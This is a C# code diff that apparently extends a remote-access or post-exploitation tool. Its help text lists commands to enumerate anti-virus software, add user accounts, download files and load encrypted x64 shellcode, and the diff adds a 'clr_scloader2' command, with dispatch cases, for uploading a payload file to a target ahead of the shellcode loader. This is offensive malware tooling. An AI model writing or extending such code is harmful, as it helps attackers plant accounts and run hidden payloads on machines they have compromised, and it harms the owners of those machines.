@@ -36,6 +36,7 @@ clr_getav                  - get anti-virus software on this machin by clr
 clr_adduser {user} {pass}  - add user by clr
 clr_download {url} {path}  - download file from url by clr
 clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
+clr_scloader2 {remotefile} - Upload Payload.bin to target before Shellcode Loader 
 exit                       - terminates the server process (and this session)"
 );
         }
@@ -354,6 +355,13 @@ exit                       - terminates the server process (and this session)"
                                 clr_exec(s);
                                 break;
                             }
+                        case "clr_scloader2":
+                            {
+                                String s = String.Empty;
+                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
+                                clr_exec(s);
+                                break;
+                            }
                         case "clr_download":
                             {
                                 String s = String.Empty;
@@ -496,6 +504,13 @@ exit                       - terminates the server process (and this session)"
                             break;
                         }
                     case "clr_scloader":
+                        {
+                            String s = String.Empty;
+                            for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
+                            clr_exec(s);
+                            break;
+                        }
+                    case "clr_scloader2":
                         {
                             String s = String.Empty;
                             for (int i = 3; i < args.Length; i++) { s += args[i] + " "; }
